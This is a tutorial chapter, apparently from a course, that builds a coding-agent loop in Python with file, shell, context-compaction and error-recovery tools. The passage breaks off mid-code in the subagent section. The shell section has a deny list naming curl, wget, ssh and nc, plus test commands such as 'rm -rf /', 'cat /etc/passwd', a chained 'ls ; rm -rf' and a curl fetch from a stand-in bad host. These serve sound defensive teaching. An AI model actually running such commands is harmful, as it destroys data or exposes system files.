# Part 6 — The Agent Loop from Scratch

**Level: ⭐⭐⭐⭐** · Requires: parts 2–4 (5 optional) · Time: ~8 h

> **This is the heart of the course.** You will build from scratch an agent in the class of Claude Code / OpenClaw: a loop
> that reads files, edits code, runs commands, remembers context and knows when to
> ask a human.
>
> **We will not use any framework.** After this chapter, when you look at LangChain or the
> Agent SDK, you will see not magic but familiar parts — and you will know which of them
> you want and which you would rather write yourself.

```bash
cd ~/llm-education   # repository directory (yours may differ)
source rig-env.sh
```

---

## Table of contents

| § | Topic | Key idea |
| :-- | :-- | :-- |
| [1](#1-what-an-agent-really-is) | **Anatomy of an agent** | it is a `while` loop, not a neural network |
| [2](#2-the-loop-skeleton) | **Skeleton** | the minimal working loop, 60 lines |
| [3](#3-tools--designing-the-surface) | **Tools** | ⭐ the surface design decides everything |
| [4](#4-file-tools--read-write-edit) | **Files** | `edit` with exact matching and a freshness check |
| [5](#5-the-shell-tool--with-approval) | **Shell** | allowlist + approval + limits |
| [6](#6-observations--truncation-and-errors) | **Observations** | a tool result is not "text", it is a resource |
| [7](#7-context-management-in-the-loop) | **Context** | budget, compaction, persistent notebook |
| [8](#8-recovering-from-errors) | **Errors** | an agent must be able to pull itself together |
| [9](#9-subagents--delegation) | **Subagents** | fresh context for read-heavy tasks |
| [10](#10-journal-and-replay) | **Journal** | ⭐ without it you cannot debug an agent |
| [11](#11-putting-it-all-together) | **Whole** | `agent.py` — complete, working |

---

## 1. What an agent really is

Let's demystify it right away:

```python
while True:
    odpowiedz = model(historia)              # 1. THINK
    if odpowiedz.chce_narzedzie:
        wynik = wykonaj(odpowiedz.narzedzie) # 2. ACT
        historia.append(wynik)               # 3. OBSERVE
    else:
        return odpowiedz.tekst               # 4. END
```

**That is all.** An agent is a `think → act → observe` loop. Everything else — all of Claude Code,
all of OpenClaw — is **engineering around those four lines**:

| Layer | What it adds | Where in this chapter |
| :-- | :-- | :-- |
| tool protocol | the model cannot call a nonexistent tool | §3 (builds on part 3) |
| file tools | reading, writing, editing with a freshness check | §4 |
| shell | executing commands with approval | §5 |
| observation handling | truncating huge results | §6 |
| context | budget and compaction so the loop does not die | §7 |
| recovery | what to do when a tool fails | §8 |
| delegation | subagents with fresh context | §9 |
| journal | recording and replaying every step | §10 |
| **sandbox** | so the agent does not destroy the system | **part 7** |
| **speed** | so it is usable offline | **part 8** |

⚠️ **The biggest beginner mistake: thinking an agent is a prompt.** An agent is a **harness** —
the code around the model. The model is replaceable. The harness is your product.

---

## 2. The loop skeleton

Start with the smallest thing that works. No classes, no abstractions.

```bash
mkdir -p $AGENT && cd $AGENT

cat > $AGENT/szkielet.py <<'PYEOF'
#!/usr/bin/env python3
"""Minimal agent loop. 60 lines. Understand this before you go further."""
import json, urllib.request

LLM = "http://127.0.0.1:8081"

# --- Tools: name -> (description, function) -----------------------------
def t_echo(tekst: str) -> str:
    return f"echo: {tekst}"

def t_dodaj(a: str, b: str) -> str:
    try:
        return str(float(a) + float(b))
    except ValueError:
        return "ERROR: a and b must be numbers"

NARZEDZIA = {
    "echo":      ("Returns the given text.",                   t_echo),
    "dodaj":     ("Adds two numbers a and b.",                 t_dodaj),
    "odpowiedz": ("Finishes the work and gives the answer.",   None),
}

def schemat() -> dict:
    """JSON Schema enforcing a valid call (part 3 §4)."""
    return {
        "type": "object",
        "properties": {
            "mysl":      {"type": "string"},
            "narzedzie": {"type": "string", "enum": list(NARZEDZIA)},
            "argumenty": {"type": "object"},
        },
        "required": ["mysl", "narzedzie", "argumenty"],
    }

def zapytaj(messages: list[dict]) -> str:
    req = urllib.request.Request(LLM + "/v1/chat/completions",
        data=json.dumps({
            "messages": messages,
            "max_tokens": 500,
            "temperature": 0,        # machine profile (part 3 §5.1)
            "repeat_penalty": 1.0,   # P21: the penalty breaks JSON
            "response_format": {"type": "json_schema", "json_schema": {"schema": schemat()}},
        }).encode(), headers={"Content-Type": "application/json"})
    r = json.load(urllib.request.urlopen(req, timeout=300))
    return r["choices"][0]["message"]["content"]

def petla(zadanie: str, max_tur: int = 8) -> str:
    opis = "\n".join(f"- {n}: {o}" for n, (o, _) in NARZEDZIA.items())
    hist = [
        {"role": "system", "content":
            f"You are an agent. In each turn you choose ONE tool.\n"
            f"Tools:\n{opis}\n\n"
            f"'mysl' is a one-sentence justification. When you have the result — use 'odpowiedz'."},
        {"role": "user", "content": zadanie},
    ]

    for tura in range(1, max_tur + 1):
        surowy = zapytaj(hist)
        krok = json.loads(surowy)                    # guaranteed by the schema
        nazwa, args = krok["narzedzie"], krok["argumenty"]
        print(f"[{tura}] {krok['mysl']}")
        print(f"     → {nazwa}({args})")

        if nazwa == "odpowiedz":
            return args.get("tresc", args.get("odpowiedz", "(no content)"))

        _, fn = NARZEDZIA[nazwa]
        try:
            wynik = fn(**args) if fn else "ERROR: tool has no implementation"
        except TypeError as e:
            wynik = f"ERROR in arguments: {e}"
        print(f"     ← {str(wynik)[:150]}")

        hist.append({"role": "assistant", "content": surowy})
        hist.append({"role": "user", "content": f"Result of {nazwa}: {wynik}"})

    return "(aborted: turn limit)"

if __name__ == "__main__":
    import sys
    z = sys.argv[1] if len(sys.argv) > 1 else "What is 1247.50 plus 892.30? Use the tool."
    print(f"TASK: {z}\n")
    print(f"\n=== RESULT ===\n{petla(z)}")
PYEOF
chmod +x $AGENT/szkielet.py
```

Run it:

```bash
pkill -f llama-server; sleep 2
export HIP_VISIBLE_DEVICES=0,1
$LB/llama-server -m $OSS20 -ngl 999 -c 16384 --port 8081 --host 127.0.0.1 --no-warmup &
sleep 25

cd $AGENT && python3 szkielet.py
```

### 2.1 Read it again and notice five things

1. **The loop has a hard limit** (`max_tur`). An agent without a limit is an electricity bill or
   an infinite loop.
2. **`assistant` gets the raw JSON**, not the parsed one. The model sees exactly what it
   generated — history consistency.
3. **The tool result comes back as `user`.** This is a convention — the model treats it as
   an "observation from the world".
4. **`NARZEDZIA[nazwa]` is safe**, because the `enum` in the schema guarantees existence.
   Zero `KeyError`s.
5. **`odpowiedz` is a tool too.** This is a pattern that simplifies everything: the agent
   always calls a tool, never "just answers". One code path.

⚠️ **Pitfall P37 (new): the model may forget to call `odpowiedz`.**
Weaker models in particular end a turn with text like "Now I will calculate the sum" — without calling
a tool. The schema blocks this (the `narzedzie` field is required), **but the model can fall
into a loop of repeating the same tool.** Defence in §8.

---

## 3. Tools — designing the surface

⭐ **This is the most important design decision in the whole agent.** More important than choosing
the model.

### 3.1 Principle: one tool = one intention that can be controlled

```
❌ BAD:   bash("rm -rf /tmp/stare && cp nowe.txt /tmp/")
          → the harness sees one opaque string
          → you cannot approve, log or restrict it

✅ GOOD:  usun_plik(sciezka="/tmp/stare")
          kopiuj(zrodlo="nowe.txt", cel="/tmp/")
          → the harness sees TYPED arguments
          → you can approve, check paths, audit
```

💡 **Rule of thumb:** start with `bash` (it gives breadth of action), and **promote
to a dedicated tool** when you need one of four things:

| Need | Example |
| :-- | :-- |
| **approval** | `usun_plik` can ask "are you sure?", `bash -c "rm ..."` cannot |
| **freshness check** | `edytuj` can refuse if the file changed since it was read |
| **special UI** | `zapytaj_uzytkownika` renders as a question, not as text |
| **parallelism** | `grep` is safe in parallel, `git push` is not |

### 3.2 The surface we will build

Exactly the one Claude Code has — because it is a battle-tested set:

| Tool | Arguments | Risk |
| :-- | :-- | :-- |
| `czytaj` | `sciezka`, `od_linii?`, `ile_linii?` | 🟢 none |
| `szukaj_plikow` | `wzorzec` | 🟢 none |
| `szukaj_w_tresci` | `wzorzec`, `katalog?` | 🟢 none |
| `zapisz` | `sciezka`, `tresc` | 🟡 overwrites |
| `edytuj` | `sciezka`, `stary_tekst`, `nowy_tekst` | 🟡 changes |
| `powloka` | `polecenie` | 🔴 **everything** |
| `zapytaj_uzytkownika` | `pytanie`, `opcje?` | 🟢 none |
| `zapisz_ustalenie` | `klucz`, `wartosc` | 🟢 persistent notebook |
| `odpowiedz` | `tresc` | 🟢 end |

### 3.3 Tool descriptions — this is where reliability is won

⭐ **The most important thing about descriptions: write WHEN to use the tool, not only WHAT it does.**

```python
# ❌ WEAK — the model does not know when to use this
"czytaj": "Reads a file."

# ✅ GOOD — the trigger condition is explicit
"czytaj": ("Reads a text file and returns its content with line numbers. "
           "ALWAYS use it before editing a file — you must know the exact content "
           "to provide a correct stary_tekst to the edytuj tool.")
```

💡 **A local 20B model is much more sensitive to descriptions than a large model.** A large one
infers from the name. A small one needs instructions. **Every 10 words in the description of the trigger
condition pay for themselves many times over.**

---

## 4. File tools — `read`, `write`, `edit`

```bash
cat > $AGENT/narzedzia_plikowe.py <<'PYEOF'
#!/usr/bin/env python3
"""Agent file tools: read / write / edit / search.

KEY RULES:
 1. Everything is confined to the WORKING DIRECTORY (path sandbox).
 2. 'edytuj' requires an EXACT match - this is deliberate.
 3. Freshness check: a file the agent has not read cannot be overwritten.
"""
import fnmatch, hashlib, os, re, subprocess

class Pliki:
    def __init__(self, katalog_roboczy: str, max_znakow: int = 20000):
        self.root = os.path.realpath(os.path.expanduser(os.path.expandvars(katalog_roboczy)))
        os.makedirs(self.root, exist_ok=True)
        self.max_znakow = max_znakow
        # path -> content hash at the time of reading (freshness check)
        self._przeczytane: dict[str, str] = {}

    # ---------- path sandbox ---------------------------------------------
    def _bezpieczna(self, sciezka: str) -> str:
        """Returns a realpath INSIDE root or raises an exception.

        realpath resolves '..' AND symlinks - this matters,
        because the agent can create a symlink and escape through it.
        """
        p = os.path.realpath(os.path.join(self.root, os.path.expanduser(os.path.expandvars(sciezka))))
        if p != self.root and not p.startswith(self.root + os.sep):
            raise PermissionError(f"path outside the working directory: {sciezka}")
        return p

    @staticmethod
    def _hash(tresc: str) -> str:
        return hashlib.sha256(tresc.encode()).hexdigest()[:16]

    # ---------- reading --------------------------------------------------
    def czytaj(self, sciezka: str, od_linii: int = 1, ile_linii: int = 0) -> str:
        p = self._bezpieczna(sciezka)
        if not os.path.isfile(p):
            return f"ERROR: no such file {sciezka}"
        with open(p, encoding="utf-8", errors="replace") as f:
            linie = f.readlines()
        self._przeczytane[p] = self._hash("".join(linie))

        od = max(1, int(od_linii))
        do = len(linie) if not ile_linii else min(len(linie), od + int(ile_linii) - 1)
        wyc = linie[od-1:do]
        out = "".join(f"{od+i:5d}| {l}" for i, l in enumerate(wyc))
        if len(out) > self.max_znakow:
            out = out[:self.max_znakow] + f"\n[... truncated, the file has {len(linie)} lines]"
        naglowek = f"# {sciezka} (lines {od}-{do} of {len(linie)})\n"
        return naglowek + out

    # ---------- writing --------------------------------------------------
    def zapisz(self, sciezka: str, tresc: str) -> str:
        p = self._bezpieczna(sciezka)
        istnial = os.path.isfile(p)
        if istnial:
            biezacy = self._hash(open(p, encoding="utf-8", errors="replace").read())
            if self._przeczytane.get(p) != biezacy:
                return (f"REFUSED: file {sciezka} exists and has not been read "
                        f"in its current version. Use 'czytaj' first.")
        os.makedirs(os.path.dirname(p) or self.root, exist_ok=True)
        with open(p, "w", encoding="utf-8") as f:
            f.write(tresc)
        self._przeczytane[p] = self._hash(tresc)
        return f"OK: {'overwrote' if istnial else 'created'} {sciezka} ({len(tresc)} characters)"

    # ---------- editing --------------------------------------------------
    def edytuj(self, sciezka: str, stary_tekst: str, nowy_tekst: str) -> str:
        """Replaces EXACTLY one occurrence. Error if 0 or >1."""
        p = self._bezpieczna(sciezka)
        if not os.path.isfile(p):
            return f"ERROR: no such file {sciezka}"
        tresc = open(p, encoding="utf-8", errors="replace").read()

        if self._przeczytane.get(p) != self._hash(tresc):
            return (f"REFUSED: {sciezka} has changed since your last read "
                    f"(or you have not read it). Use 'czytaj' and try again.")

        n = tresc.count(stary_tekst)
        if n == 0:
            return ("ERROR: I did not find stary_tekst in the file. Remember: do NOT include "
                    "line numbers or the '  123| ' prefix from the czytaj tool output.")
        if n > 1:
            return (f"ERROR: stary_tekst occurs {n} times — it must be unique. "
                    f"Add more context (a line before and after).")

        nowa = tresc.replace(stary_tekst, nowy_tekst, 1)
        with open(p, "w", encoding="utf-8") as f:
            f.write(nowa)
        self._przeczytane[p] = self._hash(nowa)
        return f"OK: replaced in {sciezka} ({len(stary_tekst)} → {len(nowy_tekst)} characters)"

    # ---------- searching ------------------------------------------------
    def szukaj_plikow(self, wzorzec: str) -> str:
        out = []
        for dirpath, dirnames, files in os.walk(self.root):
            dirnames[:] = [d for d in dirnames if not d.startswith((".git", "__pycache__", ".venv"))]
            for f in files:
                rel = os.path.relpath(os.path.join(dirpath, f), self.root)
                if fnmatch.fnmatch(rel, wzorzec) or fnmatch.fnmatch(f, wzorzec):
                    out.append(rel)
        if not out:
            return f"no files matching {wzorzec!r}"
        return f"{len(out)} files:\n" + "\n".join(sorted(out)[:200])

    def szukaj_w_tresci(self, wzorzec: str, katalog: str = ".") -> str:
        p = self._bezpieczna(katalog)
        try:
            rx = re.compile(wzorzec)
        except re.error as e:
            return f"ERROR: bad regex: {e}"
        trafienia = []
        for dirpath, dirnames, files in os.walk(p):
            dirnames[:] = [d for d in dirnames if not d.startswith((".git", "__pycache__", ".venv"))]
            for f in files:
                fp = os.path.join(dirpath, f)
                try:
                    with open(fp, encoding="utf-8", errors="ignore") as fh:
                        for i, linia in enumerate(fh, 1):
                            if rx.search(linia):
                                rel = os.path.relpath(fp, self.root)
                                trafienia.append(f"{rel}:{i}: {linia.rstrip()[:160]}")
                                if len(trafienia) >= 100:
                                    return "\n".join(trafienia) + "\n[... truncated at 100]"
                except OSError:
                    continue
        return "\n".join(trafienia) if trafienia else f"no matches for {wzorzec!r}"
PYEOF
```

### 4.1 ⭐ Why `edytuj` requires an exact match

It looks tedious. **It is deliberate and it is crucial.**

| Alternative | Why it is worse |
| :-- | :-- |
| "replace line 42" | line numbers **shift** after every edit → the agent corrupts the file |
| "replace via regex" | the model writes a bad regex and **deletes half the file** — without warning |
| **exact text, unique** | ✅ it either succeeds or **explicitly refuses** — it never silently corrupts |

⭐ **This is the "fail loud" pattern.** It is better for the agent to get an error and try again
than to silently damage a file. **A silent error in an agent that edits code means hours
of debugging.**

### 4.2 ⭐ The freshness check — a pitfall nobody talks about

Note `self._przeczytane`. The scenario without it:

```
1. the agent reads plik.py              (sees version A)
2. the agent thinks for 30 seconds
3. YOU save plik.py in your editor      (version B)
4. the agent runs edytuj() on version A  → OVERWRITES your change
```

⚠️ **Pitfall P38 (new): an agent without a freshness check eats the human's changes.**
A content hash at read time and a verification at write time is ~5 lines of code and **the only defence**.
Claude Code does exactly the same.

### 4.3 Testing the file tools

```bash
cd $AGENT && python3 - <<'PYEOF'
import sys, os
sys.path.insert(0, os.environ["AGENT"])
from narzedzia_plikowe import Pliki

p = Pliki("$AGENT/praca")

print(p.zapisz("test.py", "def suma(a, b):\n    return a + b\n\nprint(suma(2, 3))\n"))
print()
print(p.czytaj("test.py"))
print()

# Edit without reading -> refusal? (we read above, so it will pass)
print(p.edytuj("test.py", "return a + b", "return a + b  # fixed"))
print()

# Non-unique stary_tekst -> error
print(p.zapisz("dwa.py", "x = 1\nx = 1\n"))
print(p.czytaj("dwa.py"))
print(p.edytuj("dwa.py", "x = 1", "x = 2"))
print()

# Escape from the sandbox -> exception
try:
    p.czytaj("../../../etc/passwd")
except PermissionError as e:
    print(f"✅ blocked: {e}")

print()
print(p.szukaj_w_tresci("def "))
PYEOF
```

**Check that:** a non-unique edit gives an error, leaving the directory gives `PermissionError`,
and the line numbers in the `czytaj` output are present (and that the model must omit them in `stary_tekst` —
which the error message tells it).

---

## 5. The shell tool — with approval

🔴 **The riskiest tool.** Here we implement only *logical* control —
real isolation (namespaces, `bwrap`) is **part 7**.

```bash
cat > $AGENT/narzedzie_powloka.py <<'PYEOF'
#!/usr/bin/env python3
"""Shell tool with an allowlist, approval and limits.

NOTE: this is LOGICAL control, not system isolation.
A real sandbox (bwrap, namespaces) - part 7.
"""
import os, re, shlex, subprocess

# Commands allowed without asking - READ-ONLY
BEZ_PYTANIA = {
    "ls", "cat", "head", "tail", "wc", "grep", "find", "file", "stat",
    "pwd", "echo", "date", "which", "du", "df", "sort", "uniq", "diff",
    "python3", "pip", "git",          # git: see the subcommand check
}

# Commands that ALWAYS require approval
WYMAGA_ZGODY = {"rm", "mv", "cp", "chmod", "chown", "mkdir", "rmdir",
                "kill", "pkill", "tee", "truncate", "ln"}

# Never, under any circumstances
ZAKAZANE = {"sudo", "su", "dd", "mkfs", "fdisk", "shutdown", "reboot",
            "systemctl", "apt", "apt-get", "curl", "wget", "ssh", "scp", "nc"}

# Git subcommands that change remote state
GIT_WYMAGA_ZGODY = {"push", "reset", "clean", "rebase", "checkout", "restore", "commit"}

class Powloka:
    def __init__(self, katalog_roboczy: str, timeout: int = 60,
                 max_wyjscia: int = 10000, tryb_zgody: str = "pytaj"):
        """tryb_zgody: 'pytaj' | 'odrzucaj' | 'pozwalaj' (the last one only in tests!)"""
        self.root = os.path.realpath(os.path.expanduser(os.path.expandvars(katalog_roboczy)))
        os.makedirs(self.root, exist_ok=True)
        self.timeout = timeout
        self.max_wyjscia = max_wyjscia
        self.tryb_zgody = tryb_zgody
        self.dziennik: list[tuple[str, str]] = []

    # ---------- command analysis ----------------------------------------
    def _ocen(self, polecenie: str) -> tuple[str, str]:
        """Returns ('ok'|'zgoda'|'blok', reason)."""
        # Shell operators: chains hide commands from the check
        if re.search(r"[;&|`]|\$\(|>>|>", polecenie):
            return "blok", ("shell operators forbidden (; & | ` $() > >>). "
                            "Run one command at a time.")
        try:
            czesci = shlex.split(polecenie)
        except ValueError as e:
            return "blok", f"I cannot parse the command: {e}"
        if not czesci:
            return "blok", "empty command"

        prog = os.path.basename(czesci[0])
        if prog in ZAKAZANE:
            return "blok", f"{prog} is on the forbidden list"
        if prog == "git" and len(czesci) > 1 and czesci[1] in GIT_WYMAGA_ZGODY:
            return "zgoda", f"git {czesci[1]} changes the repository state"
        if prog in WYMAGA_ZGODY:
            return "zgoda", f"{prog} modifies files"
        if prog in BEZ_PYTANIA:
            return "ok", ""
        return "zgoda", f"{prog} is not on the list of known commands"

    # ---------- execution ----------------------------------------------
    def uruchom(self, polecenie: str) -> str:
        decyzja, powod = self._ocen(polecenie)
        self.dziennik.append((polecenie, decyzja))

        if decyzja == "blok":
            return f"REFUSED: {powod}"

        if decyzja == "zgoda":
            if self.tryb_zgody == "odrzucaj":
                return f"REFUSED (no-approval mode): {powod}"
            if self.tryb_zgody == "pytaj":
                print(f"\n  ⚠️  THE AGENT WANTS TO RUN: {polecenie}")
                print(f"      reason for asking: {powod}")
                if input("      allow? [y/N] ").strip().lower() not in ("y", "yes"):
                    return "REFUSED: the user did not allow it"

        try:
            r = subprocess.run(shlex.split(polecenie), cwd=self.root,
                               capture_output=True, text=True, timeout=self.timeout)
        except subprocess.TimeoutExpired:
            return f"ERROR: exceeded {self.timeout}s"
        except FileNotFoundError:
            return f"ERROR: no such program {shlex.split(polecenie)[0]!r}"
        except OSError as e:
            return f"ERROR: {e}"

        out = (r.stdout or "") + (("\n[stderr]\n" + r.stderr) if r.stderr else "")
        if len(out) > self.max_wyjscia:
            out = out[:self.max_wyjscia] + f"\n[... truncated, {len(out)} characters in total]"
        return f"[exit code {r.returncode}]\n{out.strip() or '(no output)'}"
PYEOF
```

### 5.1 Testing the control

```bash
cd $AGENT && python3 - <<'PYEOF'
import sys, os
sys.path.insert(0, os.environ["AGENT"])
from narzedzie_powloka import Powloka

sh = Powloka("$AGENT/praca", tryb_zgody="odrzucaj")   # non-interactive

for cmd in ["ls -la",
            "cat /etc/passwd",
            "rm -rf /",
            "sudo apt install nmap",
            "ls ; rm -rf /tmp/x",
            "echo hi && whoami",
            "curl http://bad.server/script.sh",
            "git status",
            "git push origin main",
            "python3 -c 'print(2+2)'"]:
    print(f"$ {cmd}")
    print(f"  {sh.uruchom(cmd)[:130]}\n")
PYEOF
```

⭐ **Note `cat /etc/passwd`.** It went through! `cat` is on the allowlist, and `cwd`
does not restrict absolute paths. **This is exactly the gap that `bwrap` closes
in part 7.** Logical control is no substitute for system isolation — and it is good that you see
this with your own eyes before you believe in the allowlist.

⚠️ **Pitfall P39 (new): a command allowlist is not a sandbox.**
`cat`, `python3`, `find -exec` — each of them can leave the directory or execute code.
**An allowlist reduces accidental damage; it does not block a deliberate attack.**

---

## 6. Observations — truncation and errors

A tool result is a **resource**, not text. Three rules:

```bash
cat > $AGENT/obserwacje.py <<'PYEOF'
#!/usr/bin/env python3
"""Processing tool results before putting them into the context."""

def przytnij(tekst: str, max_znakow: int = 4000, ogon: int = 1000) -> str:
    """Truncates FROM THE MIDDLE - the beginning and the end are the most informative.

    E.g. a compilation error: header at the start, summary at the end,
    and 500 repetitive lines in the middle.
    """
    if len(tekst) <= max_znakow:
        return tekst
    glowa = max_znakow - ogon
    pominieto = len(tekst) - glowa - ogon
    return (tekst[:glowa]
            + f"\n\n[... omitted {pominieto} characters from the middle ...]\n\n"
            + tekst[-ogon:])

def sformatuj(nazwa: str, args: dict, wynik: str, max_znakow: int = 4000) -> str:
    """An observation with an explicit error marker - the model must SEE it."""
    blad = str(wynik).startswith(("ERROR", "REFUSED", "[exit code 1", "[exit code 2"))
    znacznik = "❌ ERROR" if blad else "✅"
    return f"{znacznik} {nazwa}({_skrot(args)})\n{przytnij(str(wynik), max_znakow)}"

def _skrot(args: dict) -> str:
    """Shortens long arguments in the observation header."""
    czesci = []
    for k, v in args.items():
        s = str(v)
        czesci.append(f"{k}={s[:60]+'…' if len(s) > 60 else s!r}")
    return ", ".join(czesci)
PYEOF
```

⚠️ **Pitfall P40 (new): one observation can kill the context.**
`cat big_file.log` or `find /` returns megabytes. Without truncation **a single tool
call fills the entire context window** and the agent loses its whole working history.
**Truncation is mandatory, not optional.**

💡 **Why we truncate from the middle, not from the end.** In an error message the information is
at the start (what happened) and at the end (the summary). The middle is usually repetitive noise.
Truncating from the end loses the summary — the most valuable part.

---

## 7. Context management in the loop

```bash
cat > $AGENT/kontekst.py <<'PYEOF'
#!/usr/bin/env python3
"""Context budget + compaction + persistent notebook."""
import json, os, subprocess, urllib.request

LB  = os.path.expanduser("~/llama.cpp/build/bin")
# ⚠️ It used to be hardcoded "http://127.0.0.1:8081" - it ignored LLM_URL, which
# agent.py (11) already respects. Overriding the port in one place and not
# in the other silently broke compaction after switching the server.
LLM = os.environ.get("LLM_URL", "http://127.0.0.1:8081")

class Kontekst:
    def __init__(self, model_sciezka: str, n_ctx: int = 16384,
                 rezerwa: int = 2000, prog_kompakcji: float = 0.75):
        self.model  = os.path.expanduser(os.path.expandvars(model_sciezka))
        self.n_ctx  = n_ctx
        self.rezerwa = rezerwa
        self.prog   = prog_kompakcji
        self._cache: dict[str, int] = {}

    # ---------- counting tokens (P20: with the same tokenizer!) ---------
    def tokeny(self, tekst: str) -> int:
        klucz = tekst[:200] + str(len(tekst))
        if klucz in self._cache:
            return self._cache[klucz]
        try:
            r = subprocess.run([f"{LB}/llama-tokenize", "-m", self.model, "--stdin"],
                               input=tekst, capture_output=True, text=True, timeout=60)
            n = len([l for l in r.stdout.splitlines() if "->" in l]) or max(1, len(tekst)//3)
        except Exception:
            n = max(1, len(tekst) // 3)        # rough fallback estimate
        if len(self._cache) < 2048:
            self._cache[klucz] = n
        return n

    def zuzycie(self, messages: list[dict]) -> int:
        return sum(self.tokeny(m["content"]) for m in messages)

    def trzeba_kompaktowac(self, messages: list[dict]) -> bool:
        return self.zuzycie(messages) > (self.n_ctx - self.rezerwa) * self.prog

    # ---------- compaction --------------------------------------------
    def kompaktuj(self, messages: list[dict], zostaw: int = 6) -> list[dict]:
        if len(messages) <= zostaw + 2:
            return messages
        system, stare, swieze = messages[0], messages[1:-zostaw], messages[-zostaw:]
        if not stare:
            return messages

        tekst = "\n".join(f"{m['role']}: {m['content'][:1200]}" for m in stare)
        req = urllib.request.Request(LLM + "/v1/chat/completions",
            data=json.dumps({
              "messages": [
                {"role": "system", "content":
                   "You are summarizing an agent's work history. Keep CONCISELY: the task, "
                   "established facts (file names, numbers, errors), what was tried and with what "
                   "result, what remains. Omit repetitions and file contents. Max 350 words."},
                {"role": "user", "content": tekst}],
              "max_tokens": 700, "temperature": 0.2,
            }).encode(), headers={"Content-Type": "application/json"})
        try:
            s = json.load(urllib.request.urlopen(req, timeout=300))["choices"][0]["message"]["content"]
        except Exception as e:
            # Fallback: instead of a summary just cut
            return [system] + swieze
        return [system,
                {"role": "user", "content": f"[SUMMARY OF {len(stare)} PREVIOUS TURNS]\n{s}"},
                *swieze]

class Notatnik:
    """The agent's persistent memory OUTSIDE the context (P31: compaction loses numbers)."""
    def __init__(self, plik: str):
        self.plik = os.path.expanduser(os.path.expandvars(plik))
        os.makedirs(os.path.dirname(self.plik), exist_ok=True)
        self.dane: dict[str, str] = {}
        if os.path.exists(self.plik):
            try:
                self.dane = json.load(open(self.plik, encoding="utf-8"))
            except (OSError, json.JSONDecodeError):
                self.dane = {}

    def zapisz(self, klucz: str, wartosc: str) -> str:
        self.dane[str(klucz)] = str(wartosc)
        json.dump(self.dane, open(self.plik, "w", encoding="utf-8"),
                  ensure_ascii=False, indent=2)
        return f"OK: saved finding {klucz!r}"

    def jako_tekst(self) -> str:
        if not self.dane:
            return ""
        return "FINDINGS (persistent memory):\n" + "\n".join(
            f"  {k} = {v}" for k, v in self.dane.items())
PYEOF
```

### 7.1 ⭐ The persistent notebook — a pattern missing from most tutorials

Pitfall **P31** from part 4: compaction loses exact numbers. The solution:

```
context   = short-term memory, compactable, may lose detail
notebook  = persistent memory, a JSON file, loses NOTHING
```

After every important finding the agent calls `zapisz_ustalenie("numer_faktury", "FV/2025/143")`.
The notebook is **appended to the system prompt on every turn** — so it survives
compaction. **This is cheap and it solves a real problem.**

---

## 8. Recovering from errors

An agent must be able to pull itself together. Four mechanisms:

```bash
cat > $AGENT/odzyskiwanie.py <<'PYEOF'
#!/usr/bin/env python3
"""Detecting and interrupting pathological agent behaviours."""
from collections import Counter

class Straznik:
    def __init__(self, max_tur: int = 25, max_powtorzen: int = 3,
                 max_bledow_pod_rzad: int = 4):
        self.max_tur = max_tur
        self.max_powtorzen = max_powtorzen
        self.max_bledow = max_bledow_pod_rzad
        self.kroki: list[tuple[str, str]] = []      # (tool, argument fingerprint)
        self.bledy_pod_rzad = 0
        self.tura = 0

    def zarejestruj(self, narzedzie: str, argumenty: dict, wynik: str):
        self.tura += 1
        odcisk = repr(sorted((k, str(v)[:80]) for k, v in argumenty.items()))
        self.kroki.append((narzedzie, odcisk))
        if str(wynik).startswith(("ERROR", "REFUSED")):
            self.bledy_pod_rzad += 1
        else:
            self.bledy_pod_rzad = 0

    def problem(self) -> str | None:
        """Returns a message to inject into the agent, or None."""
        if self.tura >= self.max_tur:
            return f"STOP: limit of {self.max_tur} turns. Summarize what you have established and use 'odpowiedz'."

        if self.bledy_pod_rzad >= self.max_bledow:
            return (f"WARNING: {self.bledy_pod_rzad} errors in a row. Stop. "
                    f"Do not repeat the same thing. Either change your approach, or use "
                    f"'zapytaj_uzytkownika', or 'odpowiedz' with a description of the problem.")

        # The same tool with the same arguments N times = a loop
        if len(self.kroki) >= self.max_powtorzen:
            ostatnie = self.kroki[-self.max_powtorzen:]
            if len(set(ostatnie)) == 1:
                return (f"WARNING: you called {ostatnie[0][0]} with identical arguments "
                        f"{self.max_powtorzen} times. This is a loop. Change your approach.")

        # Oscillation between two tools: A B A B A B
        if len(self.kroki) >= 6:
            szesc = [k[0] for k in self.kroki[-6:]]
            if len(set(szesc)) == 2 and szesc[::2] == szesc[1::2][:len(szesc[::2])]:
                pass  # the ABABAB pattern - rare, but worth knowing
            if len(set(szesc)) <= 2 and len(set(self.kroki[-6:])) <= 2:
                return ("WARNING: you are going back and forth between two tools with no progress. "
                        "Summarize what you have learned and decide.")
        return None
PYEOF
```

⭐ **Four pathologies you must detect** — each one seen in real agents:

| Pathology | Detection | Reaction |
| :-- | :-- | :-- |
| **turn limit** | counter | force a summary |
| **the same action N times** | fingerprint `(tool, arguments)` | inject "this is a loop, change your approach" |
| **N errors in a row** | counter reset by a success | tell it to ask the human |
| **A↔B oscillation** | a set of two tools within 6 steps | tell it to summarize and decide |

💡 **The key trick: don't abort — inject a message.** Instead of killing the loop, add
a `user` message to the history: "this is a loop, change your approach". **The model usually corrects itself.**
Leave the hard abort for the turn limit.

---

## 9. Subagents — delegation

When a task requires **reading a lot** but returning **little** — delegate to a subagent
with fresh context.

```bash
cat > $AGENT/subagent.py <<'PYEOF'
#!/usr/bin/env python3
"""Subagent: its own fresh context; returns only a report."""
import json, os, urllib.request

# ⚠️ The same fix as in kontekst.py - respect LLM_URL instead of
# hardcoding 8081.
LLM = os.environ.get("LLM_URL", "http://127.0.0.1:8081")

def subagent(zadanie: str, narzedzia_tylko_czytajace: dict,
             max_tur: int = 10, max_tokenow_raportu: int = 600) -> str:
    """Runs a child loop with its OWN history.

    Returns a concise report. The parent's context does NOT bloat with everything
    the subagent had to read.
    """
    opis = "\n".join(f"- {n}: {o}" for n, (o, _) in narzedzia_tylko_czytajace.items())
    schemat = {
        "type": "object",
        "properties": {
            "mysl":      {"type": "string"},
            "narzedzie": {"type": "string",
                          "enum": list(narzedzia_tylko_czytajace) + ["raport"]},
            "argumenty": {"type": "object"},
        },
        "required": ["mysl", "narzedzie", "argumenty"],
    }
    hist = [
        {"role": "system", "content":
            f"You are a research subagent. You have ONE task and only reading "
            f"tools:\n{opis}\n- raport: finishes the work and returns the findings.\n\n"
            f"Gather information and return a CONCISE report. Give specifics: file names, "
            f"line numbers, numbers. Do not summarize with generalities."},
        {"role": "user", "content": zadanie},
    ]

    for _ in range(max_tur):
        req = urllib.request.Request(LLM + "/v1/chat/completions",
            data=json.dumps({"messages": hist, "max_tokens": 700, "temperature": 0,
                             "repeat_penalty": 1.0,
